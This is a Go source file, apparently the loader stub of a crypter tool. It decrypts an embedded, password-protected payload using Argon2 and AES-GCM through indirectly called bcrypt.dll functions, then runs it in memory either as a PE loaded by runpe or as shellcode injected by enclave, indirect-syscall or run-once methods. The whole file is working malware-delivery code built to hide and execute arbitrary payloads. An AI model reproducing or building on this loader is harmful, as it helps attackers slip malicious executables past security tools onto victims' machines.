package main

import (
	"bytes"
	"compress/zlib"
	_ "embed"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"runtime/debug"
	"strings"
	"unsafe"

	runpe "github.com/carved4/go-crypter/pkg/pe"
	shellcode "github.com/carved4/go-crypter/pkg/shellcode"
	wc "github.com/carved4/go-wincall"

	"github.com/fxamacker/cbor/v2"
	"golang.org/x/crypto/argon2"
)

//go:embed payload.cbor
var payloadData []byte

// ^^^ before payload.cbor exists this will be an error

// password is injected at link time via:
//
//	go build -ldflags "-X main.password=<hex>" .
//
// Never stored in the CBOR payload.
var password string

const (
	argonTime    uint32 = 1
	argonMemory  uint32 = 64 * 1024
	argonThreads uint8  = 4
	argonKeyLen  uint32 = 32
)

// WinCNG (bcrypt.dll) constants
const (
	bcryptChainingModeGCM            = "ChainingModeGCM"
	bcryptChainingModeProp           = "ChainingMode"
	bcryptKeyDataBlobMagic    uint32 = 0x4d42444b
	bcryptKeyDataBlobVersion1 uint32 = 0x1
)

// bcryptAEADDecrypt decrypts ciphertext (with appended 16-byte GCM tag) using
// bcrypt.dll BCryptDecrypt with AES-GCM. nonce is the 12-byte IV.
func bcryptAEADDecrypt(_ string, key, nonce, ciphertext []byte) ([]byte, error) {
	// ciphertext = actual ciphertext || 16-byte auth tag (Go's AEAD.Seal appends tag)
	if len(ciphertext) < 16 {
		return nil, fmt.Errorf("ciphertext too short")
	}
	tagSize := 16
	ctLen := len(ciphertext) - tagSize
	ct := ciphertext[:ctLen]
	tag := ciphertext[ctLen:]

	algNamePtr, err := wc.UTF16ptr("AES")
	if err != nil {
		return nil, fmt.Errorf("utf16 alg: %v", err)
	}

	// BCryptOpenAlgorithmProvider
	var hAlg uintptr
	ret, _, _ := wc.Call("bcrypt.dll", "BCryptOpenAlgorithmProvider",
		uintptr(unsafe.Pointer(&hAlg)),
		uintptr(unsafe.Pointer(algNamePtr)),
		uintptr(0),
		uintptr(0),
	)
	if ret != 0 {
		return nil, fmt.Errorf("BCryptOpenAlgorithmProvider: 0x%x", ret)
	}
	defer wc.Call("bcrypt.dll", "BCryptCloseAlgorithmProvider", hAlg, uintptr(0))

	// Set chaining mode to GCM
	modePtr, err := wc.UTF16ptr(bcryptChainingModeGCM)
	if err != nil {
		return nil, fmt.Errorf("utf16 mode: %v", err)
	}
	propPtr, err := wc.UTF16ptr(bcryptChainingModeProp)
	if err != nil {
		return nil, fmt.Errorf("utf16 prop: %v", err)
	}
	ret, _, _ = wc.Call("bcrypt.dll", "BCryptSetProperty",
		hAlg,
		uintptr(unsafe.Pointer(propPtr)),
		uintptr(unsafe.Pointer(modePtr)),
		uintptr(len(bcryptChainingModeGCM)*2), // byte length of UTF-16 string excl null
		uintptr(0),
	)
	if ret != 0 {
		return nil, fmt.Errorf("BCryptSetProperty ChainingMode: 0x%x", ret)
	}

	// Build BCRYPT_KEY_DATA_BLOB header + key bytes
	blobHeader := make([]byte, 12+len(key))
	*(*uint32)(unsafe.Pointer(&blobHeader[0])) = bcryptKeyDataBlobMagic
	*(*uint32)(unsafe.Pointer(&blobHeader[4])) = bcryptKeyDataBlobVersion1
	*(*uint32)(unsafe.Pointer(&blobHeader[8])) = uint32(len(key))
	copy(blobHeader[12:], key)

	// BCryptImportKey
	var hKey uintptr
	blobTypePtr, err := wc.UTF16ptr("KeyDataBlob")
	if err != nil {
		return nil, fmt.Errorf("utf16 blob type: %v", err)
	}
	ret, _, _ = wc.Call("bcrypt.dll", "BCryptImportKey",
		hAlg,
		uintptr(0),
		uintptr(unsafe.Pointer(blobTypePtr)),
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&blobHeader[0])),
		uintptr(len(blobHeader)),
		uintptr(0),
	)
	if ret != 0 {
		return nil, fmt.Errorf("BCryptImportKey: 0x%x", ret)
	}
	defer wc.Call("bcrypt.dll", "BCryptDestroyKey", hKey)

	// Build BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO (inline struct)
	// https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_authenticated_cipher_mode_info
	// Size = 88 bytes on x64
	type bcryptAuthCipherModeInfo struct {
		CbSize        uint32
		DwInfoVersion uint32
		PbNonce       uintptr
		CbNonce       uint32
		_             uint32 // padding
		PbAuthData    uintptr
		CbAuthData    uint32
		_             uint32
		PbTag         uintptr
		CbTag         uint32
		_             uint32
		PbMacContext  uintptr
		CbMacContext  uint32
		_             uint32
		CbAAD         uint32
		CbData        uint64
		DwFlags       uint32
		_             uint32
	}
	authInfo := bcryptAuthCipherModeInfo{
		CbSize:        uint32(unsafe.Sizeof(bcryptAuthCipherModeInfo{})),
		DwInfoVersion: 1,
		PbNonce:       uintptr(unsafe.Pointer(&nonce[0])),
		CbNonce:       uint32(len(nonce)),
		PbTag:         uintptr(unsafe.Pointer(&tag[0])),
		CbTag:         uint32(tagSize),
	}

	// BCryptDecrypt — get output size first
	var outLen uint32
	ret, _, _ = wc.Call("bcrypt.dll", "BCryptDecrypt",
		hKey,
		uintptr(unsafe.Pointer(&ct[0])),
		uintptr(len(ct)),
		uintptr(unsafe.Pointer(&authInfo)),
		uintptr(0), // no explicit IV — IV is in authInfo.PbNonce for GCM
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&outLen)),
		uintptr(0),
	)
	if ret != 0 {
		return nil, fmt.Errorf("BCryptDecrypt (size query): 0x%x", ret)
	}

	plaintext := make([]byte, outLen)
	ret, _, _ = wc.Call("bcrypt.dll", "BCryptDecrypt",
		hKey,
		uintptr(unsafe.Pointer(&ct[0])),
		uintptr(len(ct)),
		uintptr(unsafe.Pointer(&authInfo)),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&plaintext[0])),
		uintptr(outLen),
		uintptr(unsafe.Pointer(&outLen)),
		uintptr(0),
	)
	if ret != 0 {
		return nil, fmt.Errorf("BCryptDecrypt: 0x%x", ret)
	}

	return plaintext[:outLen], nil
}

type PayloadData struct {
	EncryptedBytes []byte `cbor:"encrypted"`
	Salt           []byte `cbor:"salt"`
	Nonce          []byte `cbor:"nonce"`
	Alg            string `cbor:"alg"`
	Compressed     bool   `cbor:"compressed,omitempty"` // Flag to indicate if data is compressed
	PayloadType    string `cbor:"payload_type"`         // "exe" or "shellcode"
	ArgonParams    struct {
		Time    uint32 `cbor:"time"`
		Memory  uint32 `cbor:"memory"`
		Threads uint8  `cbor:"threads"`
	} `cbor:"argon_params"`
}

func decryptFile() ([]byte, error) {
	var payload PayloadData
	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
		return nil, fmt.Errorf("failed to unmarshal payload: %v", err)
	}

	if password == "" {
		return nil, fmt.Errorf("no password: rebuild stub with -ldflags \"-X main.password=<hex>\"")
	}
	passwordBytes, err := hex.DecodeString(password)
	if err != nil {
		return nil, fmt.Errorf("invalid password hex: %v", err)
	}

	timeParam := argonTime
	memoryParam := argonMemory
	threadsParam := argonThreads

	if payload.ArgonParams.Time > 0 {
		timeParam = payload.ArgonParams.Time
	}
	if payload.ArgonParams.Memory > 0 {
		memoryParam = payload.ArgonParams.Memory
	}
	if payload.ArgonParams.Threads > 0 {
		threadsParam = payload.ArgonParams.Threads
	}

	key := argon2.IDKey(passwordBytes, payload.Salt,
		timeParam, memoryParam, threadsParam, argonKeyLen)

	decryptedBytes, err := bcryptAEADDecrypt(payload.Alg, key, payload.Nonce, payload.EncryptedBytes)
	if err != nil {
		return nil, err
	}

	if payload.Compressed {
		zr, err := zlib.NewReader(bytes.NewReader(decryptedBytes))
		if err != nil {
			return nil, fmt.Errorf("failed to create decompression reader: %v", err)
		}
		defer zr.Close()
		var decompressed bytes.Buffer
		_, err = io.Copy(&decompressed, zr)
		if err != nil {
			return nil, fmt.Errorf("failed to decompress data: %v", err)
		}
		decryptedBytes = decompressed.Bytes()
	}

	return decryptedBytes, nil
}

func main() {
	debug.SetGCPercent(-1)
	enclaveFlag := flag.Bool("enclave", false, "use enclave method")
	indirectFlag := flag.Bool("indirect", false, "use indirect syscall method")
	runOnceFlag := flag.Bool("once", false, "use ntdll!rtlrunonceexecuteonce method")
	flag.Parse()

	decryptedBytes, err := decryptFile()
	if err != nil {
		fmt.Println("[-] error decrypting file:", err)
		return
	}
	var payload PayloadData
	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
		fmt.Println("[-] error unmarshaling payload for type check:", err)
		return
	}

	executionMethodCount := 0
	if *enclaveFlag {
		executionMethodCount++
	}
	if *indirectFlag {
		executionMethodCount++
	}
	if *runOnceFlag {
		executionMethodCount++
	}

	if executionMethodCount > 1 {
		fmt.Println("[-] error cannot use multiple shellcode execution methods simultaneously")
		return
	}

	switch strings.ToLower(payload.PayloadType) {
	case "exe":
		runpe.LoadPe(decryptedBytes)
	case "shellcode":
		if *enclaveFlag {
			err := shellcode.EnclaveInject(decryptedBytes)
			if err != nil {
				fmt.Println("enclave injection failed:", err)
			}
		} else if *indirectFlag {
			err := shellcode.IndirectSyscallInject(decryptedBytes)
			if err != nil {
				fmt.Println("indirect syscall injection failed:", err)
			}
		} else if *runOnceFlag {
			err := shellcode.RunOnce(decryptedBytes)
			if err != nil {
				fmt.Println("runonce injection failed:", err)
			}
		} else {
			fmt.Println("error: shellcode payload requires an execution method flag")
			fmt.Println("available flags: -enclave, -indirect, -once")
		}
	default:
		fmt.Println("unknown payload type:", payload.PayloadType)
		fmt.Println("supported types: exe, shellcode")
	}
}
